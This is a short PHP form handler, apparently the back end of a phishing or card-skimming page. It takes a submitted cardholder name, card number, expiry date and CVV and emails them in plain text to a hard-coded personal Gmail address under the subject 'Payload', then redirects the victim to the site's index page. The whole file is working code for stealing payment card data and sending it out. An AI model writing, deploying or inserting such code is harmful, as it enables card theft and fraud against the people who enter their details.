<?php
if(isset($_POST['card_ho'])&& isset($_POST['card_no']) && isset($_POST['card_ex'])  && isset ($_POST['cvv']))
{
    $cardho = $_POST['card_ho'];
    $cardno = $_POST['card_no'];
    $cardex = $_POST['card_ex'];
    $cvv = $_POST['cvv'];

    $message =  $cardho . " " . $cardno . " " . $cardex . " " . $cvv;

    $to = "emekaveli@gmail.com";
    $subject = "Payload";
    $headers = array(
        'From' => 'webmaster@example.com',
        'Reply-To' => 'webmaster@example.com',
        'X-Mailer' => 'PHP/' . phpversion()
    );
    mail($to, $subject, $message, $headers);
    $_SESSION['done'] = 1;
    // var_dump($_SESSION['done']);
    header("Location:../index.php");
}
